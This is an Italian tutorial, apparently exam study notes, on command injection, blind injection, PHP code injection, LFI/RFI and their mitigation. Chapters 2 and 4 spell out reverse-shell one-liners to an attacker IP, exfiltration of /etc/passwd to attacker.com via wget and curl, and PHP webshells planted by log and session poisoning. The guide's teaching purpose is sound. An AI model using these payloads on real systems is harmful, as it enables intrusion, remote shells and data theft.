# Capitolo 1: Introduzione alle Iniezioni e Command Injection — Basi ed Identificazione

Le vulnerabilità di **Command Injection** si verificano quando un'applicazione web passa dati non fidati forniti dall'utente direttamente a una shell di sistema (es. `sh`, `bash`, `cmd.exe`) senza adeguata sanificazione, consentendo l'esecuzione di comandi arbitrari con i privilegi del processo web server (es. `www-data`).

L'impatto compromette l'intera triade **CIA**:

* **Confidenzialità**: Lettura di file di configurazione, credenziali e file di sistema (`/etc/passwd`, chiavi SSH).
* **Integrità**: Modifica, crittografia o cancellazione di dati e sorgenti sul filesystem.
* **Disponibilità**: Crash dell'applicazione, saturazione delle risorse o arresto forzato del server.

---

### 1.1 Meccanismo di Iniezione (Il Caso `ping`)

Quando un'applicazione usa utility di sistema (es. `ping`, `curl`, `imagemagick`) concatenando l'input utente:

```php
// Backend Vulnerabile
$host =$_GET['host'];

system("ping -c 1 " . $host);
```

* **Uso Legittimo**: Inserendo `google.com`, il sistema esegue: `ping -c 1 google.com`.
* **Sfruttamento**: Inserendo `google.com; id`, il sistema interpreta il separatore `;` ed esegue in sequenza:
```bash
ping -c 1 google.com; id
```

---

### 1.2 Operatori Shell per Concatenazione e Controllo Flusso

- **Separatore Sequenziale (`;` o `\n` / `%0a`)**: Esegue i comandi in sequenza indipendentemente dall'esito del primo.
    
- **AND Logico (`cmd1 && cmd2`)**: Esegue `cmd2` solo se `cmd1` ha successo (exit code `0`).
    
- **OR Logico (`cmd1 || cmd2`)**: Esegue `cmd2` solo se `cmd1` fallisce (exit code $\neq 0$).
    
- **Pipe (`cmd1 | cmd2`)**: Passa l'output (`stdout`) di `cmd1` come input (`stdin`) a `cmd2`.
    
- **Command Substitution (`$(cmd)` o cmd )**: Esegue il comando e ne sostituisce l'output inline (es. `ls $(whoami)`).

---

### 1.3 Identificazione delle Vulnerabilità (Blackbox vs Whitebox)

**A. Analisi Blackbox**

* Individuazione di endpoint che richiamano strumenti esterni (utility di rete, generatori PDF, tool di compressione/conversione).
* Fuzzing dei parametri con caratteri speciali di controllo shell: `;`, `|`, `&`, `\n` (`%0a`), `$()`, apice

**B. Analisi Whitebox (Ricerca dei Sinks in PHP)**
- **`system($cmd)`**: Esegue il comando e stampa direttamente l'output a schermo.
- **`passthru($cmd)`**: Esegue il comando e invia l'output grezzo (_raw binary_) direttamente al browser.
- **`exec($cmd)`**: Esegue il comando e restituisce solo l'**ultima riga** dell'output.
- **`shell_exec($cmd)` o backtick (`` `cmd` ``)**: Esegue il comando e restituisce l'**intero output** sotto forma di stringa.
- **`popen()` / `proc_open()`**: Apre un processo e alloca pipe bidirezionali per la gestione avanzata di I/O.

---

### 1.4 Tecniche di Conferma della Vulnerabilità

* **Error-based**: Iniezione di un comando inesistente (es. `test_invalid_cmd`). La presenza nei log o nella risposta HTTP di stringhe come `bash: command not found: test_invalid_cmd` conferma l'esecuzione via shell.
* **Time-based**: Iniezione di un ritardo artificiale (es. `; sleep 5 #`). Se il server risponde con un delay corrispondente, l'esecuzione arbitraria è verificata (cruciale negli scenari *Blind*).

---

# Capitolo 2: Blind Command Injection e Tecniche di Esfiltrazione Dati

Nelle situazioni di **Blind Command Injection**, il server esegue il comando iniettato a livello di sistema operativo ma **non restituisce l'output nella risposta HTTP**. Per confermare l'esecuzione ed esfiltrare dati sensibili, si utilizzano tre tecniche principali.

---

### 2.1 Tecnica 1: Reindirizzamento dell'Output su File Web-Accessible

Sfrutta l'operatore di reindirizzamento dello standard output (`>`) per salvare il risultato del comando all'interno del *web root*.

* **Comando iniettato**:
```bash
cat /etc/passwd > output.txt
```


* **Requisiti fondamentali della directory target**:
	1. **Permessi di Scrittura**: Il processo del web server (es. `www-data`) deve poter creare/scrivere file nella cartella.
	2. **Accessibilità Web**: La cartella deve essere configurata per servire file statici accessibili via browser (es. `/uploads/`, `/static/`, `/css/`).


* **Lettura del risultato**: Si accede direttamente all'URL del file generato:
```text
http://target.com/uploads/output.txt
```



---

### 2.2 Tecnica 2: Connessione Out-of-Band (OOB) tramite Reverse Shell

Costringe il server vittima a stabilire una connessione di rete in uscita verso un listener gestito dall'attaccante.

**Perché Reverse Shell vs Bind Shell?**

* **Bind Shell (Inadatta)**: Apre una porta sul target; fallisce perché i firewall bloccano quasi sempre il traffico in ingresso (*inbound*) su porte non standard.
* **Reverse Shell (Efficace)**: La connessione parte dal server verso l'esterno; le regole di firewall perimetrali sono storicamente permissive sul traffico in uscita (*outbound*).

```text
┌─────────────────┐                      ┌─────────────────┐
│   Attaccante    │                      │  Server Vittima │
│  (In ascolto)   │ <------------------- │  (Vulnerabile)  │
└─────────────────┘ Connessione in uscita└─────────────────┘

```

**Fasi Operative**:

1. **Setup Listener (Macchina Attaccante)**:
```bash
nc -lvp 1337

```


2. **Iniezione del Payload (Server Vittima)**:
* *Metodo Standard (se `nc -e` è disponibile)*:
```bash
nc -e /bin/bash IP_ATTACCANTE 1337

```


* *Metodo Nativo Linux via `/dev/tcp` (standard universale)*:
```bash
sh -i >& /dev/tcp/IP_ATTACCANTE/1337 0>&1

```


> **Spiegazione**: `sh -i` avvia una shell interattiva, `/dev/tcp/...` instaura il socket TCP e `>& / 0>&1` reindirizzano `stdin`, `stdout` e `stderr` direttamente sulla socket.

---

### 2.3 Tecnica 3: Esfiltrazione Dati via Pingback (Out-of-Band)

Quando non è possibile aprire una shell completa, si utilizzano utility di sistema per inviare i dati tramite richieste HTTP a un listener controllato (es. `ngrok`, `Webhook.site`).

##### 1. Semplice Conferma di Esecuzione:
```bash
wget http://attacker.com/ping
```
La presenza della richiesta GET nei log del server conferma la vulnerabilità.

##### 2. Esfiltrazione di Stringhe Brevi (Command Substitution):
```bash
wget http://attacker.com/$(whoami)
# oppure
curl http://attacker.com/`id`
```
Il comando interno viene valutato prima della chiamata di rete (es. GET verso `/www-data`).

##### 3. Esfiltrazione di File Completi (HTTP POST via `wget`):
```bash
wget --post-file /etc/passwd http://attacker.com/
```
Invia l'intero contenuto del file sensibile nel body della richiesta POST.

---

# Capitolo 3: Code Injection e il caso di PHP (Local File Inclusion — LFI)

La distinzione fondamentale tra **Command Injection** e **Code Injection** risiede nel contesto di esecuzione e nell'interprete che valuta l'input:

* **Command Injection**: L'input raggiunge la **shell di sistema** (`bash`, `sh`). L'attaccante esegue binari del sistema operativo (`ls`, `cat`, `whoami`).
* **Code Injection**: L'input viene valutato direttamente dall'**interprete del linguaggio** (es. motore PHP, Python, Node.js). L'attaccante inietta istruzioni sintatticamente valide per quel linguaggio.

---

### 3.1 I Sinks Dinamici del Code Injection

La vulnerabilità si manifesta quando l'applicazione passa stringhe non fidate a costrutti o funzioni native concepite per prendere una semplice stringa di testo e ordinare all'interprete di trattarla ed eseguirla come se fosse codice sorgente vero e proprio.

* `eval()`
* `assert()` (in versioni legacy di PHP o configurazioni insicure)
* `create_function()` (deprecata/rimossa in PHP moderno ma rilevante nei test legacy)

**Fuzzing Blackbox per Code Injection**:

Si testano caratteri speciali che alterano la sintassi dell'interprete:

* Singoli e doppi apici (`'` e `"`): Per rompere e chiudere le stringhe di contesto.
* Dollaro (`$`) e backtick (```): Per provocare errori di parsing su variabili o sostituzioni.
* Backslash (`\`): Per verificare la gestione dei caratteri di escape.

---

### 3.2 PHP Code Injection: Il Costrutto `include` e la nascita dell'LFI

In PHP, i costrutti `include`, `require`, `include_once` e `require_once` caricano, leggono ed eseguono il codice presente in un file specificato.

Se il percorso del file da includere è controllato dall'utente senza sanitizzazione, si genera una vulnerabilità di **Local File Inclusion (LFI)**:

```php
// Codice Vulnerabile
$page = $_GET['page'];
include($page);

```

* **Uso Legittimo**: `index.php?page=about.php` $\rightarrow$ include ed esegue `about.php`.
* **Sfruttamento LFI**: `index.php?page=/etc/passwd` $\rightarrow$ include `/etc/passwd`.

> **Comportamento dell'interprete**:
> * Se il file contiene tag `<?php ... ?>`, l'interprete PHP li **esegue** lato server.
> * Se il file contiene testo semplice (come `/etc/passwd`), PHP non trovando tag PHP lo **stampa direttamente** nel corpo della risposta HTTP (diventando a tutti gli effetti un vettore di *File Disclosure*).

---

### 3.3 Differenza tra LFI e RFI (Remote File Inclusion)

* **LFI (Local File Inclusion)**: L'inclusione è limitata ai file già presenti sul filesystem locale del server.
* **RFI (Remote File Inclusion)**: L'applicazione include file residenti su server remoti terzi (es. `include("http://attacker.com/shell.txt"`).

> **Nota di configurazione (`php.ini`)**:
> Negli ambienti PHP moderni, la direttiva `allow_url_include` è impostata di default su `Off`, bloccando l'inclusione da URL remoti e rendendo l'RFI estremamente raro rispetto all'LFI.

---

# Capitolo 4: Dall'LFI alla Remote Code Execution (File Poisoning, Upload e Webshell)

La transizione da **Local File Inclusion (LFI)** a **Remote Code Execution (RCE)** consente all'attaccante di passare dalla sola lettura passiva di file all'esecuzione arbitraria di comandi e codice sul server.

---
### 4.1 La Regola d'Oro dell'LFI-to-RCE

In PHP, l'interprete esegue esclusivamente le porzioni di codice racchiuse all'interno dei tag standard `<?php ... ?>`. Qualsiasi contenuto al di fuori di tali tag viene ignorato dall'interprete e restituito come semplice testo a schermo.

Per elevare un LFI a RCE, l'attaccante deve riuscire a scrivere codice PHP valido all'interno di una risorsa sul filesystem locale e successivamente forzarne il caricamento tramite `include()`.

---
### 4.2 Metodo 1: Sfruttare l'Upload di File

* **A. File Non Eseguibili + LFI (Polyglot / Embedded Payload)**:
1. Si inserisce un payload PHP (es. `<?php system($_GET['cmd']); ?>`) all'interno dei metadati EXIF o nei commenti di un'immagine valida (`.jpg`, `.png`).
2. Si carica l'immagine tramite una normale form di upload consentita dall'applicazione (es. avatar utente).
3. Si include il file tramite il parametro LFI:
```text
index.php?page=uploads/avatar.jpg&cmd=id
```

4. PHP ignora i byte binari dell'immagine ed esegue il blocco PHP iniettato.

* **B. Upload Diretto di Script PHP (Senza LFI)**:
	Se l'applicazione non convalida l'estensione del file né ridenomina l'upload salvandolo in una cartella accessibile via web, si carica direttamente un file `.php` navigando al suo percorso pubblico (es. `http://target.com/uploads/shell.php`).

---

### 4.3 Metodo 2: File Poisoning (Avvelenamento dei File)

Consiste nello sfruttare una funzionalità applicativa legittima per scrivere tag PHP all'interno di file di testo locali (accessibili in lettura dall'interprete), per poi richiamarli tramite LFI.

```text
┌──────────────────────────────────────┐
│  Attaccante invia Payload in HTTP    │
│  (es. User-Agent: <?php ... ?>)      │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│  Il Web Server scrive il log su file │
│  (es. access.log contiene il tag)    │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│  Attaccante richiede LFI del log     │
│  (include('/var/log/access.log'))    │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│   PHP esegue il codice iniettato!    │
└──────────────────────────────────────┘

```

**Vettori di Avvelenamento Comuni**:

##### Log Poisoning:
* Si invia una richiesta HTTP inserendo codice PHP all'interno di header tracciati (es. `User-Agent`, `Referer`) o parametri di login falliti.
* Si include il file di log (es. `/var/log/apache2/access.log` o file di log custom dell'app) tramite LFI.
##### Session Poisoning:
* PHP memorizza le sessioni in file di testo locali (tipicamente in `/tmp/sess_<PHPSESSID>` o `/var/lib/php/sessions/`).
* Se un campo del profilo controllato dall'utente viene salvato in sessione (es. `$_SESSION['username']`), si inietta il payload come username e si include il file di sessione corrispondente al proprio cookie.
##### Database Locali / Cache Poisoning:
* Scrittura di blocchi PHP all'interno di database locali su file (es. database SQLite) o file temporanei di cache.

---

### 4.4 Tips & Tricks d'Esame: Gestione dei Payload

* **Webshell Minimali (One-Liners)**:
	Evitare payload complessi che rischiano di corrompersi durante la scrittura nei log o nelle immagini. Iniettare un punto di accesso dinamico minimale:
```php
<?php eval($_GET['c']); ?>
```

Permette poi l'esecuzione arbitraria passando qualsiasi istruzione via parametro GET:
```text
index.php?page=uploads/avatar.jpg&c=print_r(scandir('.'));
```

* **Gestione della direttiva `disable_functions`**:
	Se le funzioni di sistema (`system()`, `exec()`, `passthru()`, `shell_exec()`) sono disabilitate nel `php.ini`, utilizzare le funzioni native del motore PHP (raramente bloccate):
	* Per esplorare la directory corrente: `print_r(scandir('.'));`
	* Per leggere file sensibili: `echo file_get_contents('/flag.txt');`

---

# Capitolo 5: Strategie di Mitigazione e Tecniche di Sanificazione Sicura

La prevenzione delle vulnerabilità di **Command Injection** e **Code Injection** si basa sul principio della riduzione della superficie d'attacco, privilegiando scelte architetturali sicure rispetto a filtri applicativi a valle.

---

### 5.1 Regola Fondamentale: Evitare l'Esecuzione Dinamica

La difesa primaria consiste nell'eliminare completamente l'invocazione di shell di sistema o interpreti dinamici a runtime con input forniti dall'utente:

* **Sostituzione di comandi shell**: Usare API native del linguaggio anziché invocare binari esterni (es. usare funzioni native di rete o librerie grafiche invece di chiamare `ping` o `convert` da riga di comando).
* **Mappatura Statica per Inclusione File**: Evitare di passare nomi di file dinamici a `include` o `require`. Utilizzare strutture dati fisse (dizionari/array associativi) che associano parametri utente a percorsi hardcoded:

```php
$pages = [
    'home'    => 'pages/home.php',
    'about'   => 'pages/about.php',
    'contact' => 'pages/contact.php'
];
$selected = $_GET['page'] ?? 'home';
if (array_key_exists($selected, $pages)) {
    include($pages[$selected]);
}
```

---

### 5.2 Validazione dell'Input: Whitelist vs Blacklist

##### Whitelist (Approccio Consigliato):
* **Metodologia**: Definisce a priori l'insieme esatto dei valori o dei pattern ammessi (es. solo caratteri alfanumerici `^[a-zA-Z0-9]+$`), rifiutando sistematicamente tutto il resto.
* **Efficacia**: **Sicura**. Non richiede di prevedere tutte le possibili varianti di payload, evasioni o codifiche alternative dell'attaccante.
##### Blacklist (Approccio Sconsigliato):
* **Metodologia**: Tenta di intercettare e bloccare una lista di caratteri speciali o parole chiave malevole note (es. `;`, `|`, `&&`, `eval`, `system`).
* **Efficacia**: **Inefficace**. Facilmente aggirabile tramite tecniche di encoding alternativo (URL-encoding, hex, unicode), caratteri non previsti o manipolazioni della logica del parser.
---

### 5.3 Funzioni di Escaping per Comandi di Sistema

Se l'invocazione di un comando di sistema è indispensabile, l'input deve essere neutralizzato prima di raggiungere la shell.

* **`escapeshellarg()` (Standard PHP)**:
	Racchiude l'argomento tra singoli apici (`'`) ed effettua l'escape dei singoli apici interni.
	* **Effetto**: Costringe la shell a interpretare l'intera stringa come un **singolo argomento letterale**, disinnescando metacaratteri e separatori come `;`, `&&`, `|`, `\n`.

* **`escapeshellcmd()`**:
	Esegue l'escape dei caratteri speciali di controllo della shell, ma non impedisce l'aggiunta di ulteriori argomenti/flag al comando (usare con cautela rispetto a `escapeshellarg()`).

---

### 5.4 Difesa in Profondità: Sandboxing e Isolamento

Il sandboxing isola il processo di esecuzione riducendo l'impatto di un'eventuale compromissione:

* **Containerizzazione e Jail**: Esecuzione dei processi applicativi all'interno di container non privilegiati (rootless), con filesystem di root in sola lettura (`read-only`) e chroot jail.
* **Restrizioni sui Privilegi**: Esecuzione del demone web con utenti a privilegi minimi (`least privilege`), privi di permessi di scrittura sul codice sorgente o su directory di sistema.
* **Disabilitazione Funzioni nel Runtime**: Configurazione rigorosa dell'interprete (es. direttiva `disable_functions` in `php.ini` per bloccare `system`, `exec`, `passthru`, `shell_exec`, `proc_open`).

> **Nota di sicurezza sui Sandbox**:
> Il sandboxing è una misura di mitigazione e non una soluzione definitiva: vulnerabilità logiche, bug di memoria o configurazioni errate possono consentire un'evasione dal sandbox (*sandbox escape*).